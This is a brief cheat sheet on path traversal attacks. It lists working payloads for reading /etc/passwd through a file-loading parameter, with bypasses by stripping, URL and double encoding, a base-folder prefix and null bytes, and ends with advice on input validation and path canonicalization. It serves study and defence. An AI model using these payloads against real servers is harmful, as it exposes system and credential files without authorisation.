# Path traversal

## General info
- ` <img src="/loadImage?filename=218.png"> `
- An attacker can request the following URL to retrieve the /etc/passwd file from the server's filesystem
- ` https://insecure-website.com/loadImage?filename=../../../etc/passwd `
- On Windows, both ../ and ..\ are valid directory traversal sequences

## Bypass defences
- elimination (strip):  `../ ` -> `....// `
  - Test: try to change the orginal request `GET /image?filename=1.jpg` to `GET /image?filename=../1.jpg`
  - If the file is loaded the code strip `../`
- encode: ` %2e%2e%2f `
- double-encode: ` %252e%252e%252f `
- require to start with the expected base folder es. `/var/www/images` -> `filename=/var/www/images/../../../etc/passwd`
- require to end with an expected file extension es. `.png` -> `filename=../../../etc/passwd%00.png`
- others

## Suggestions
- Don't always trust error messages
  - `GET /image?filename=/etc/passwd` ---> "No such file"
    - Try to add null byte: `GET /image?filename=/etc/passwd%00`
    - Try to add null byte and extension: `GET /image?filename=/etc/passwd%00.png`
- Combine the cases:
  - Example: `....//....//....//etc/passwd%00.jpg` (strip, double-encode, null byte, whitelist exstension)
  - `%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252Fetc%252Fpasswd%252500%252Ejpg`

## Defences
- Avoid passing user-supplied input to filesystem APIs
- Use two layers of defense to prevent attacks
  - Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.
  - After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.
